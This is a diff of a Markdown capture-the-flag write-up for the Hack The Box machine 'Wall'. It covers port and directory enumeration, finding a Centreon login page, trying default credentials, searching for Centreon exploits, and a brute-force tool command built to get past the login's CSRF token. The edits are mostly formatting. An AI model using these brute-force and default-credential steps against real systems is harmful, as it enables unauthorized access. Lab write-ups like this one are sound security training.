@@ -89,7 +89,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 19.80 seconds
            Raw packets sent: 1305 (57.396KB) | Rcvd: 1055 (42.196KB)
 ```
-Ports **22** and **80**. I want to focus on 80 first - over to http://10.10.10.157/ and I get the default apache page:
+Ports **22** and **80**. I want to focus on **80** first - over to http://10.10.10.157/ and I get the default apache page:
 
 ![Apache](./images/apache.png)
 **Figure 1:** Apache
@@ -122,7 +122,7 @@ Not too much interesting in Nikto, and nothing immediately strikes me as interes
 
 ### Dirb
 
-Dirb does come back with some actual results using common wordlist:
+Dirb does come back with some actual results using the common wordlist:
 
 ```console
 root@endeavour:~/htb/wall# dirb http://10.10.10.157 /usr/share/dirb/wordlists/common.txt
@@ -157,27 +157,9 @@ I also tried DirBuster and got a few different results:
 
 ## User Flag
 
-```console
-root@endeavour:~/htb/wall# searchsploit apache 2.4
----------------------------------------------------------------- ----------------------------------------
- Exploit Title                                                  |  Path
-                                                                | (/usr/share/exploitdb/)
----------------------------------------------------------------- ----------------------------------------
-Apache 2.2.4 - 413 Error HTTP Request Method Cross-Site Scripti | exploits/unix/remote/30835.sh
-Apache 2.4.17 - Denial of Service                               | exploits/windows/dos/39037.php
-Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Loca | exploits/linux/local/46676.php
-Apache 2.4.23 mod_http2 - Denial of Service                     | exploits/linux/dos/40909.py
-Apache 2.4.7 + PHP 7.0.2 - 'openssl_seal()' Uninitialized Memor | exploits/php/remote/40142.php
-Apache 2.4.7 mod_status - Scoreboard Handling Race Condition    | exploits/linux/dos/34133.txt
-Apache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak                | exploits/linux/webapps/42745.py
-Apache Tomcat 3.2.3/3.2.4 - 'RealPath.jsp' Information Disclosu | exploits/multiple/remote/21492.txt
-Apache Tomcat 3.2.3/3.2.4 - 'Source.jsp' Information Disclosure | exploits/multiple/remote/21490.txt
-Apache Tomcat 3.2.3/3.2.4 - Example Files Web Root Full Path Di | exploits/multiple/remote/21491.txt
----------------------------------------------------------------- ----------------------------------------
-Shellcodes: No Result
-```
+At this point I had lost connection with the box, so I bounced it and re-connected. I re-ran all the above scans and ended up coming out with our first actionable item: http://10.10.10.157/centreon/.
 
-At this point I had lost connection with the box, so I bounced it and re-connected. I re-ran all the above scans and ended up coming out with our first actionable item: http://10.10.10.157/centreon/. Its a web app with a login page. According to google the default credentials to this app are either root or admin and password centreon. Neither combination worked - that'd be too easy anyway. Search for a Centreon exploit next:
+Its a web app with a login page. According to google the default credentials to this app are either `root` or `admin` and password `centreon`. Neither combination worked - that'd be too easy anyway. Search for a Centreon exploit next:
 
 ```console
 root@endeavour:~/htb/wall# searchsploit centreon
@@ -203,17 +185,17 @@ Shellcodes: No Result
 ```
 there is a 19.04 RCE, but in reading it: Exploit Title: Centreon v19.04 **authenticated** Remote Code Execution. We need to get creds somewhere for this to work. Enumerate further and we'll find:
 
-http://10.10.10.157/centreon/api/
-http://10.10.10.157/centreon/static/js/
-http://10.10.10.157/centreon/admin.php
+```http://10.10.10.157/centreon/api/```  
+```http://10.10.10.157/centreon/static/js/```  
+```http://10.10.10.157/centreon/admin.php```  
 
-Looking through the source in the API there is a CSRF token we need to get around if we are going to brute force this login. Google leads us to: https://github.com/J3wker/anti-CSRF_Token-Bruteforce. It's usage is the following:
+Looking through the source in the API there is a CSRF token we need to get around if we are going to brute force this login. Google leads us to: [anti-CRSF_Token-Bruteforce(]https://github.com/J3wker/anti-CSRF_Token-Bruteforce). It's usage is the following:
 
 ```console
 python3 brutecsrf.py --url http://test.com/index.php --csrf name_csrf_token_in_HTML_form --u admin --fuser user_name_in_HTML_form --passwd password_name_in_HTML_form
 ```
 
-So to build our command we need the the CSRF token name from the html source, a username, the username field in the html source and the password name in the html form. Taking a look at the request in burp, **Centreon_token** is the name of our csrf token, fuser is **useralias**, the password is **passwd**. We'll use admin as the username we want to brute force.
+So to build our command we need the the CSRF token name from the html source, a username, the username field in the html source and the password name in the html form. Taking a look at the request in burp, **Centreon_token** is the name of our csrf token, fuser is **useralias**, the password is **passwd**. We'll use `admin` as the username we want to brute force.
 
 ```console
 root@endeavour:~/htb/wall/anti-CSRF_Token-Bruteforce# ./brutecsrf.py --url http://10.10.10.157/centreon/index.php --csrf centreon_token --u admin --fuser useralias --passwd password
